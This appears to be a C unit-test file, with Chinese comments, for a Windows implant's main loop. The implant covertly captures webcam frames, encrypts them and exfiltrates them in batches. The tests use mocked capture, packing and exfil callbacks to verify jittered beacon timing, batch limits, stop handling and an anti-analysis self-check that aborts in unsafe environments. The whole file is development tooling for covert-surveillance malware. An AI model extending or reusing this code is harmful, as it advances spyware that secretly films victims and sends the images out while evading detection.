/*
 * agent_windows/tests/test_implant.c
 *
 * 植入体主循环的真实性验证。用 mock 采集后端 + 注入的时间源与回调，
 * 真跑状态机，不靠模拟。
 *
 * 最关键的一条是「未注入 pack 时绝不回传明文」——
 * 若这条被破坏，植入体会把未加密的帧直接送出去，而功能上仍然"跑得通"。
 */

#include "implant.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int pass = 0, fail = 0;

#define CHECK(cond, msg) do { \
    if (cond) { printf("[PASS] %s\n", msg); pass++; } \
    else      { printf("[FAIL] %s\n", msg); fail++; } \
} while (0)

/* ---- 注入的时间源 ---- */
static uint64_t g_now = 1000000;   /* 起点非 0，避免与时间 0 的边界混淆 */
static uint64_t fake_now(void *ud) { (void)ud; return g_now; }

/* ---- 回调记账 ---- */
typedef struct {
    int   pack_calls;
    int   exfil_calls;
    size_t last_in_len;
    size_t last_out_len;
    int   pack_should_fail;
    int   exfil_should_fail;
    int   defend_ret;
    int   defend_calls;
} hooks_t;

static int h_pack(const uint8_t *in, size_t in_len,
                  uint8_t *out, size_t *out_len, void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->pack_calls++;
    h->last_in_len = in_len;
    if (h->pack_should_fail) return -1;
    if (!in || in_len == 0) return -1;
    /* 假打包：明文前加 4 字节标记，长度 +4。真实部署接 20_packer */
    if (*out_len < in_len + 4) return -1;
    out[0] = 'P'; out[1] = 'K'; out[2] = 0; out[3] = 1;
    memcpy(out + 4, in, in_len);
    *out_len = in_len + 4;
    h->last_out_len = *out_len;
    return 0;
}

static int h_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->exfil_calls++;
    if (h->exfil_should_fail) return -1;
    if (!data || len == 0) return -1;
    (void)name;
    return 0;
}

static int h_defend(void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->defend_calls++;
    return h->defend_ret;
}

static implant_cfg_t base_cfg(void)
{
    implant_cfg_t c;
    memset(&c, 0, sizeof(c));
    c.cam.width       = 640;
    c.cam.height      = 480;
    c.cam.capture_ms  = 3000;
    c.cam.max_frames  = 1;
    c.cam.prefer_mjpeg = true;
    c.interval_ms     = 1000;
    c.jitter_ms       = 0;
    c.max_batches     = 0;
    c.frames_per_batch= 1;
    c.jpeg_quality    = 75;
    c.stop_on_error   = true;
    c.run_defend      = false;
    return c;
}

/* 跑固定步数，返回最后一步的错误码 */
static implant_err_t run_steps(implant_t *im, int n)
{
    implant_err_t e = IMPLANT_OK;
    for (int i = 0; i < n; i++) {
        e = implant_step(im);
        if (e != IMPLANT_OK) return e;
        if (implant_cur_state(im) == ST_DONE) return IMPLANT_STOPPED;
    }
    return e;
}

int main(void)
{
    /* 1. 参数边界 */
    CHECK(implant_create(NULL, "mock") == NULL, "cfg 为 NULL 时 create 返回 NULL");

    /* 2. 正常创建 + 初始状态 */
    implant_cfg_t cfg = base_cfg();
    implant_t *im = implant_create(&cfg, "mock");
    CHECK(im != NULL, "create 成功");
    CHECK(implant_cur_state(im) == ST_INIT, "初始状态为 INIT");

    implant_set_now(im, fake_now, NULL);

    /* 3. INIT -> DEFEND（枚举 + 权限检查通过） */
    CHECK(implant_step(im) == IMPLANT_OK, "INIT 步通过（有设备、有权限）");
    CHECK(implant_cur_state(im) == ST_DEFEND, "INIT 后进入 DEFEND");

    /* 4. 核心安全断言：未注入 pack 时绝不回传明文 */
    {
        hooks_t h; memset(&h, 0, sizeof(h));
        implant_set_exfil(im, h_exfil, &h);
        implant_err_t e = run_steps(im, 20);
        CHECK(e == IMPLANT_ERR_PACK, "未注入 pack 时返回 ERR_PACK");
        CHECK(h.exfil_calls == 0, "未注入 pack 时 exfil 一次都没被调用（无明文外泄）");
        const implant_stats_t *s = implant_stats(im);
        CHECK(s && s->frames_total == 0, "未注入 pack 时帧计数为 0");
    }
    implant_destroy(im);

    /* 5. 完整跑通一批 */
    {
        implant_cfg_t c = base_cfg();
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);

        implant_err_t e = run_steps(m, 20);
        /* max_batches=0 表示不限，但只要跑满一批就检查 */
        const implant_stats_t *s = implant_stats(m);
        CHECK(h.pack_calls >= 1, "打包回调被调用");
        CHECK(h.exfil_calls >= 1, "回传回调被调用");
        CHECK(s && s->batches_done >= 1, "至少完成一批");
        CHECK(s && s->frames_total >= 1, "至少采集一帧");
        CHECK(s && s->bytes_total > 0, "回传字节数大于 0");
        CHECK(h.last_in_len > 0 && h.last_out_len == h.last_in_len + 4,
              "打包输出 = 输入 + 4 字节标记");
        (void)e;
        implant_destroy(m);
    }

    /* 6. 对抗自检失败 -> 拒绝运行 */
    {
        implant_cfg_t c = base_cfg();
        c.run_defend = true;
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        h.defend_ret = -1;   /* 环境不安全 */
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);
        implant_set_defend(m, h_defend, &h);

        implant_err_t e = run_steps(m, 20);
        CHECK(e == IMPLANT_ERR_DEFEND, "对抗自检失败返回 ERR_DEFEND");
        CHECK(h.exfil_calls == 0, "对抗失败时未回传任何数据");
        CHECK(implant_cur_state(m) == ST_FAIL, "对抗失败后状态为 FAIL");
        implant_destroy(m);
    }

    /* 7. 对抗自检通过 -> 正常运行 */
    {
        implant_cfg_t c = base_cfg();
        c.run_defend = true;
        c.max_batches = 1;
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        h.defend_ret = 0;
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);
        implant_set_defend(m, h_defend, &h);

        run_steps(m, 20);
        CHECK(h.defend_calls == 1, "对抗自检只执行一次（仅首批前）");
        const implant_stats_t *s = implant_stats(m);
        CHECK(s && s->batches_done == 1, "对抗通过后完成 1 批");
        implant_destroy(m);
    }

    /* 8. max_batches 限制 */
    {
        implant_cfg_t c = base_cfg();
        c.max_batches = 2;
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);
        implant_set_defend(m, h_defend, &h);

        for (int i = 0; i < 40; i++) {
            implant_err_t e = implant_step(m);
            if (e != IMPLANT_OK) break;
            /* 推进时间，让 WAIT 能到期 */
            g_now += 2000000;
        }
        const implant_stats_t *s = implant_stats(m);
        CHECK(s && s->batches_done == 2, "max_batches=2 时恰好完成 2 批");
        CHECK(implant_cur_state(m) == ST_DONE, "达到上限后状态为 DONE");
        implant_destroy(m);
    }

    /* 9. 时间未到期不推进 */
    {
        g_now = 1000000;
        implant_cfg_t c = base_cfg();
        c.max_batches = 5;
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);

        run_steps(m, 20);   /* 跑完第一批 */
        const implant_stats_t *s1 = implant_stats(m);
        uint32_t b1 = s1 ? s1->batches_done : 0;

        /* 不推进时间，再跑 20 步：应一直卡在 WAIT */
        run_steps(m, 20);
        const implant_stats_t *s2 = implant_stats(m);
        CHECK(s2 && s2->batches_done == b1, "时间未到期时批数不增加");
        CHECK(implant_cur_state(m) == ST_WAIT, "时间未到期时停留在 WAIT");
        implant_destroy(m);
    }

    /* 10. stop() 生效 */
    {
        g_now = 1000000;
        implant_cfg_t c = base_cfg();
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);
        run_steps(m, 20);
        uint32_t before = implant_stats(m)->batches_done;
        implant_stop(m);
        implant_err_t e = run_steps(m, 10);
        CHECK(e == IMPLANT_STOPPED, "stop() 后返回 STOPPED");
        CHECK(implant_stats(m)->batches_done == before,
              "stop() 后不再产生新批次");
        implant_destroy(m);
    }

    /* 11. 抖动落在 [interval, interval+jitter] */
    {
        g_now = 1000000;
        implant_cfg_t c = base_cfg();
        c.interval_ms = 1000;
        c.jitter_ms   = 500;
        c.max_batches = 3;
        implant_t *m = implant_create(&c, "mock");
        hooks_t h; memset(&h, 0, sizeof(h));
        implant_set_now(m, fake_now, NULL);
        implant_set_pack(m, h_pack, &h);
        implant_set_exfil(m, h_exfil, &h);
        int ok = 1;
        for (int i = 0; i < 60; i++) {
            if (implant_step(m) != IMPLANT_OK) break;
            /* 首批不等（last_gap_ms=0 表示"立即执行"），只检查排定过的批次 */
            if (implant_cur_state(m) == ST_WAIT &&
                implant_stats(m)->batches_done >= 1) {
                uint64_t g = implant_stats(m)->last_gap_ms;
                if (g < 1000 || g > 1500) { ok = 0; printf("   gap=%llu\n",
                    (unsigned long long)g); }
            }
            g_now += 3000000;
        }
        CHECK(ok, "抖动后的间隔落在 [1000, 1500] 内");
        implant_destroy(m);
    }

    /* 12. 错误字符串与状态名非空 */
    CHECK(implant_errstr(IMPLANT_ERR_PACK) != NULL &&
          strlen(implant_errstr(IMPLANT_ERR_PACK)) > 0, "errstr 非空");
    CHECK(implant_state_name(ST_EXFIL) != NULL, "state_name 非空");
    CHECK(implant_stats(NULL) == NULL, "stats(NULL) 返回 NULL");

    printf("\n=== result: %d pass, %d fail ===\n", pass, fail);
    return fail ? 1 : 0;
}
